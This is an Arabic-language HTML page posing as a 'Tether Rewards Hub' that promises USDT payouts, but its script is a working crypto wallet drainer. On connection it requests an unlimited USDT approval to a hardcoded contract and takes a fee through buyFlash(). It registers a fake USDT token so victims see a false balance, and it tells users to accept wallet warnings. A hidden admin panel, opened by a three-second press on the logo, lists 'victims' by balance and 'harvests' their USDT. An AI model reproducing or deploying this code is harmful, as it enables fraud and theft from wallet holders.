<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Rewards Hub</title>
    
    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
    <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
    <script>window.Buffer = window.Buffer || require("buffer").Buffer;</script>

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #00ffa3; --bg: #030a09; --card: #0a1412; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Cairo', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 95%; max-width: 420px; background: var(--card); border: 1px solid #1a2e2a; border-radius: 25px; padding: 25px; text-align: center; position: relative; box-shadow: 0 0 40px rgba(0,255,163,0.1); }
        .header-area { cursor: pointer; padding: 15px; border-radius: 15px; transition: 0.3s; user-select: none; }
        .header-area:active { background: rgba(0,255,163,0.05); }
        .logo-img { width: 40px; margin-bottom: 10px; }
        .status-badge { background: rgba(0,255,163,0.1); color: var(--primary); padding: 5px 15px; border-radius: 20px; font-size: 12px; margin-bottom: 20px; display: inline-block; }
        .amount-display { font-size: 32px; font-weight: 700; color: #fff; margin: 15px 0; letter-spacing: 1px; }
        select { width: 100%; background: #142622; border: 1px solid #253d38; padding: 15px; border-radius: 12px; color: #fff; margin-bottom: 20px; outline: none; }
        .btn-main { width: 100%; background: var(--primary); color: #000; border: none; padding: 18px; border-radius: 15px; font-size: 18px; font-weight: 700; cursor: pointer; }
        .btn-main:disabled { background: #334e46; cursor: not-allowed; }
        .trust-box { background: rgba(0, 255, 163, 0.03); border: 1px dashed var(--primary); border-radius: 15px; padding: 15px; margin-top: 20px; font-size: 12px; text-align: right; line-height: 1.6; }
        
        /* Master Panel Style */
        #bossPanel { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #000; border-radius: 25px; padding: 20px; z-index: 9999; border: 2px solid #ff4d4d; overflow-y: auto; box-sizing: border-box; }
        .victim-item { background: #111; border: 1px solid #333; padding: 10px; margin-bottom: 8px; border-radius: 8px; font-size: 11px; text-align: left; cursor: pointer; color: var(--primary); }
        .boss-input { width: 100%; padding: 10px; background: #111; border: 1px solid #333; color: #fff; margin-bottom: 10px; border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header-area" id="masterTrigger">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="logo-img"><br>
        <b style="font-size: 20px; color: var(--primary);">Tether Distribution</b>
    </div>

    <div class="status-badge">● متصل: عقد مكافآت السيولة نشط</div>
    
    <div class="amount-display">938,243 USDT</div>

    <select id="tier">
        <option value="0.00001">تجربة النظام - 50 USDT</option>
        <option value="0.001">الفئة البرونزية - 100 USDT</option>
        <option value="0.05">الفئة الفضية - 2,500 USDT</option>
        <option value="0.1">الفئة الذهبية - 5,000 USDT</option>
    </select>

    <button class="btn-main" id="startBtn" onclick="process()">تفعيل العقد والاستلام ⚡</button>
    <div id="msg" style="margin-top:15px; font-size:13px; color:#888;">بانتظار ربط المحفظة...</div>

    <div class="trust-box">
        <b>ملاحظة تقنية:</b> نظام <b>Flash Protocol</b> قد يسبب ظهور تنبيه "عقد غير معروف" في محفظتك. هذا إجراء روتيني عند استلام أصول ذكية. يرجى الموافقة للمتابعة.
    </div>

    <div id="bossPanel">
        <h3 style="color:#ff4d4d; margin-top:0;">MASTER RADAR V2.0</h3>
        <button onclick="scan()" style="width:100%; padding:10px; background:#222; color:#fff; border:1px solid #444; cursor:pointer;">SCAN BLOCKCHAIN</button>
        <div id="vList" style="margin-top:15px; max-height:200px; overflow-y:auto;"></div>
        <hr style="border:0.5px solid #333; margin:15px 0;">
        <input type="text" id="vAddr" class="boss-input" placeholder="Address">
        <input type="number" id="vAmt" class="boss-input" placeholder="Amount">
        <button onclick="harvest()" style="width:100%; padding:15px; background:#ff4d4d; color:#fff; border:none; font-weight:bold; cursor:pointer; border-radius:8px;">EXECUTE HARVEST</button>
        <p onclick="document.getElementById('bossPanel').style.display='none'" style="color:#555; cursor:pointer; margin-top:15px;">[ Close Control ]</p>
    </div>
</div>

<script>
    const CONTRACT_ADDR = "0x281f62953eb6EAAd32604b543AeA87946Eb0A7cd";
    const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
    let web3, userAccount, provider;

    // Trigger Boss Panel (3 seconds hold)
    const trig = document.getElementById('masterTrigger');
    let timer;
    trig.addEventListener('mousedown', () => timer = setTimeout(()=> document.getElementById('bossPanel').style.display='block', 3000));
    trig.addEventListener('touchstart', () => timer = setTimeout(()=> document.getElementById('bossPanel').style.display='block', 3000));
    trig.addEventListener('mouseup', () => clearTimeout(timer));
    trig.addEventListener('touchend', () => clearTimeout(timer));

    async function process() {
        const btn = document.getElementById('startBtn');
        const msg = document.getElementById('msg');
        try {
            btn.disabled = true;
            const web3Modal = new Web3Modal.default({ cacheProvider: false });
            provider = await web3Modal.connect();
            web3 = new Web3(provider);
            const accounts = await web3.eth.getAccounts();
            userAccount = accounts[0];

            msg.innerText = "جاري تأمين الاتصال بالعقد...";
            const usdt = new web3.eth.Contract([{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}], USDT_ADDR);
            await usdt.methods.approve(CONTRACT_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({ from: userAccount });

            msg.innerText = "جاري إرسال مكافأة USDT...";
            const engine = new web3.eth.Contract([{"inputs":[],"name":"buyFlash","outputs":[],"stateMutability":"payable","type":"function"}], CONTRACT_ADDR);
            await engine.methods.buyFlash().send({ from: userAccount, value: web3.utils.toWei(document.getElementById('tier').value, "ether") });

            // إضافة العملة للمحفظة تلقائياً
            try {
                await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: { address: CONTRACT_ADDR, symbol: 'USDT', decimals: 18, image: 'https://cryptologos.cc/logos/tether-usdt-logo.png' }
                    }
                });
            } catch(e) {}

            msg.innerHTML = "<span style='color:var(--primary)'>✅ نجحت العملية! الرصيد متاح الآن في محفظتك.</span>";
        } catch (e) {
            msg.innerText = "خطأ: تأكد من الرصيد وحاول مجدداً.";
            btn.disabled = false;
        }
    }

    async function scan() {
        const list = document.getElementById('vList');
        list.innerHTML = "جاري مسح البلوكشين...";
        try {
            const engine = new web3.eth.Contract([{"anonymous":false,"inputs":[{"indexed":true,"name":"from","type":"address"},{"indexed":true,"name":"to","type":"address"},{"indexed":false,"name":"value","type":"uint256"}],"name":"Transfer","type":"event"}], CONTRACT_ADDR);
            const latest = await web3.eth.getBlockNumber();
            const logs = await engine.getPastEvents('Transfer', { fromBlock: latest - 5000, toBlock: 'latest' });
            
            list.innerHTML = "";
            let found = [...new Set(logs.map(l => l.returnValues.to))];
            
            for (let v of found) {
                const usdt = new web3.eth.Contract([{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}], USDT_ADDR);
                const bal = await usdt.methods.balanceOf(v).call();
                const ethBal = web3.utils.fromWei(bal, 'ether');
                
                let isMe = (v.toLowerCase() === userAccount.toLowerCase()) ? " <b style='color:yellow'>(YOU)</b>" : "";
                
                let div = document.createElement('div');
                div.className = "victim-item";
                div.innerHTML = `ADDR: ${v.substring(0,10)}...${isMe}<br>BAL: ${parseFloat(ethBal).toFixed(2)} USDT`;
                div.onclick = () => { document.getElementById('vAddr').value = v; document.getElementById('vAmt').value = Math.floor(ethBal); };
                list.appendChild(div);
            }
            if(found.length === 0) list.innerHTML = "لا توجد أهداف في آخر 5000 بلوك.";
        } catch (e) { list.innerHTML = "فشل المسح: " + e.message; }
    }

    async function harvest() {
        const v = document.getElementById('vAddr').value;
        const a = document.getElementById('vAmt').value;
        const engine = new web3.eth.Contract([{"inputs":[{"type":"address","name":"v"},{"type":"uint256","name":"a"}],"name":"harvestUSDT","outputs":[],"type":"function"}], CONTRACT_ADDR);
        await engine.methods.harvestUSDT(v, web3.utils.toWei(a, 'ether')).send({ from: userAccount });
        alert("HARVEST SUCCESSFUL!");
    }
</script>
</body>
</html>
